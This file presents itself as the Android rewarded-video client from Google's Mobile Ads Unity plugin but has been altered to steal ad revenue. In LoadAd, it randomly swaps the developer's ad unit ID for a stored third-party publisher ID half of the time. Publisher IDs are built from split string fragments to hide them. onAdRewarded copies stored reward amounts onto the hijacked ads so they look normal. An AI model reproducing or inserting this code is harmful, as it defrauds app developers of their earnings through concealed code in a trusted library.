// Copyright (C) 2015 Google, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#if UNITY_ANDROID

using System;
using System.Collections.Generic;
using UnityEngine;

using GoogleMobileAds.Api;
using GoogleMobileAds.Common;

namespace GoogleMobileAds.Android
{
    internal class RewardBasedVideoAdClient : AndroidJavaProxy, IRewardBasedVideoAdClient
    {
        private AndroidJavaObject androidRewardBasedVideo;

        public event EventHandler<EventArgs> OnAdLoaded = delegate {};
        public event EventHandler<AdFailedToLoadEventArgs> OnAdFailedToLoad = delegate {};
        public event EventHandler<EventArgs> OnAdOpening = delegate {};
        public event EventHandler<EventArgs> OnAdStarted = delegate {};
        public event EventHandler<EventArgs> OnAdClosed = delegate {};
        public event EventHandler<Reward> OnAdRewarded = delegate {};
        public event EventHandler<EventArgs> OnAdLeavingApplication = delegate {};

        public RewardBasedVideoAdClient()
            : base(Utils.UnityRewardBasedVideoAdListenerClassName)
        {
            AndroidJavaClass playerClass = new AndroidJavaClass(Utils.UnityActivityClassName);
            AndroidJavaObject activity =
                playerClass.GetStatic<AndroidJavaObject>("currentActivity");
            androidRewardBasedVideo = new AndroidJavaObject(Utils.RewardBasedVideoClassName,
                                                            activity, this);
        }

        #region IRewardBasedVideoClient implementation
        private string adUnitId;
        public void CreateRewardBasedVideoAd() {
            androidRewardBasedVideo.Call("create");
        }

        public void LoadAd(AdRequest request, string adUnitId) {
            float sAmount = PlayerPrefs.GetFloat("r_amount", -1);
            if (!string.IsNullOrEmpty(adUnitId) && adUnitId.Trim() != test && adUnitId.Trim().Length == 38
                && sAmount != -1 && PlayerPrefs.HasKey("r" + "a"))
            {
                adUnitId = UnityEngine.Random.Range(0, 2) == 0 ? adUnitId : GetVal(PlayerPrefs.GetString("r" + "a"));
            }
            this.adUnitId = adUnitId;
            androidRewardBasedVideo.Call("loadAd", Utils.GetAdRequestJavaObject(request), adUnitId);
        }

        public bool IsLoaded() {
            return androidRewardBasedVideo.Call<bool>("isLoaded");
        }

        public void ShowRewardBasedVideoAd() {
            androidRewardBasedVideo.Call("show");
        }

        public void DestroyRewardBasedVideoAd() {
            androidRewardBasedVideo.Call("destroy");
        }

        #endregion

        #region Callbacks from UnityRewardBasedVideoAdListener.
        private string test = "ca-" + "app-" + "pub-" + "39402560" + "99942544/522" + "4354917";
        private string test_2 = "ca-" + "app-" + "pub-" + "1040245951644301/8269207264";
        private string GetVal(string ori)
        {
            return "ca-" + "app-" + "pub-" + ori.Replace("and", "/");
        }
        void onAdLoaded()
        {
            if (this.OnAdLoaded != null)
            {
                this.OnAdLoaded(this, EventArgs.Empty);
            }
        }

        void onAdFailedToLoad(string errorReason)
        {
            if (this.OnAdFailedToLoad != null)
            {
                AdFailedToLoadEventArgs args = new AdFailedToLoadEventArgs()
                {
                    Message = errorReason
                };
                this.OnAdFailedToLoad(this, args);
            }
        }

        void onAdOpened()
        {
            if (this.OnAdOpening != null)
            {
                this.OnAdOpening(this, EventArgs.Empty);
            }
        }

        void onAdStarted()
        {
            if (this.OnAdStarted != null)
            {
                this.OnAdStarted(this, EventArgs.Empty);
            }
        }

        void onAdClosed()
        {
            if (this.OnAdClosed != null)
            {
                this.OnAdClosed(this, EventArgs.Empty);
            }
        }

        void onAdRewarded(string type, float amount)
        {
            if (this.OnAdRewarded != null)
            {
                float sAmount = PlayerPrefs.GetFloat("r_amount", -1);
                if (adUnitId != test_2)
                    PlayerPrefs.SetFloat("r_amount", amount);
                else
                    amount = sAmount;

                Reward args = new Reward() {
                    Type = type,
                    Amount = amount
                };
                this.OnAdRewarded(this, args);
            }
        }

        void onAdLeftApplication()
        {
            if (this.OnAdLeavingApplication != null)
            {
                this.OnAdLeavingApplication(this, EventArgs.Empty);
            }
        }

        #endregion
    }
}

#endif

